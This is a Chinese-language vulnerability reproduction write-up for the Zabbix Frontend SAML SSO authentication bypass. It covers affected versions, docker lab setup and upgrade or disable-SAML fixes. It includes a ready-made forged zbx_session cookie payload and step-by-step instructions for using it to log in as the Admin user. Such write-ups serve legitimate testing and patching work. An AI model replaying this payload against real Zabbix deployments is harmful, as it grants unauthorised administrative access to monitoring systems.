01
漏洞简介

Zabbix Sia Zabbix是拉脱维亚Zabbix SIA（Zabbix Sia）公司的一套开源的监控系统。该系统支持网络监控、服务器监控、云监控和应用监控等。


Zabbix Frontend 存在安全漏洞，该漏洞源于在启用 SAML SSO 身份验证（非默认）的情况下，恶意行为者可以修改会话数据，因为存储在会话中的用户登录未经过验证。未经身份验证的恶意攻击者可能会利用此问题来提升权限并获得对 Zabbix 前端的管理员访问权限。




02
漏洞影响版本

Zabbix 5.4.0 - 5.4.8

zabbix 6.0.0 alpha1




03
漏洞环境搭建

可通过docker搭建漏洞环境

执行命令

docker run --name mysql-server \                                         

      --network=zabbix-net \

      --restart=always \

      -p 3306:3306 \

      -e MYSQL_DATABASE="zabbix" \

      -e MYSQL_USER="zabbix" \

      -e MYSQL_PASSWORD="zabbix_pwd" \

      -e MYSQL_ROOT_PASSWORD="root_pwd" \

      -d mysql:8.0 \

      --character-set-server=utf8 \

      --collation-server=utf8_bin

通过docker搭建mysql8.0环境



执行命令

docker run --name zabbix-java-gateway -t \

      --network=zabbix-net \

      --restart unless-stopped \

      -d zabbix/zabbix-java-gateway:alpine-5.4-latest

通过docker搭建java gateway环境



执行命令

docker run --name zabbix-server-mysql -t \                           

      -e DB_SERVER_HOST="mysql-server" \

      -e MYSQL_DATABASE="zabbix" \

      -e MYSQL_USER="zabbix" \

      -e MYSQL_PASSWORD="zabbix_pwd" \

      -e MYSQL_ROOT_PASSWORD="root_pwd" \

      -e ZBX_JAVAGATEWAY="zabbix-java-gateway" \

      --network=zabbix-net \

      -p 10051:10051 \

      --restart unless-stopped \

      -d zabbix/zabbix-server-mysql:alpine-5.4-latest

通过docker搭建zabbix server主程序



执行命令

docker run --name zabbix-web-nginx-mysql -t \                     

      -e ZBX_SERVER_HOST="zabbix-server-mysql" \

      -e DB_SERVER_HOST="mysql-server" \   

      -e MYSQL_DATABASE="zabbix" \      

      -e MYSQL_USER="zabbix" \    

      -e MYSQL_PASSWORD="zabbix_pwd" \

      -e MYSQL_ROOT_PASSWORD="root_pwd" \

      --network=zabbix-net \

04
漏洞复现

在zabbix启用SAML的情况下，攻击者可通过篡改cookie值来实现任意用户登录，cookie payload：

Cookie: zbx_session=eyJzYW1sX2RhdGEiOnsidXNlcm5hbWVfYXR0cmlidXRlIjoiQWRtaW4ifSwic2Vzc2lvbmlkIjoiIiwic2lnbiI6IiJ9

第一步：攻击者点击Sign in with Single Sign-On (SAML)，并抓取数据包



第二步：攻击者将攻击数据包Cookie篡改为Cookie: zbx_session=eyJzYW1sX2RhdGEiOnsidXNlcm5hbWVfYXR0cmlidXRlIjoiQWRtaW4ifSwic2Vzc2lvbmlkIjoiIiwic2lnbiI6IiJ9，点击GO，即可跳转到管理后台主页



第三步：攻击者成功登录到管理后台





05
漏洞修复

1、将zabbix升级到不存在漏洞的版本，https://support.zabbix.com/browse/ZBX-20350。

2、禁用SAML身份验证。
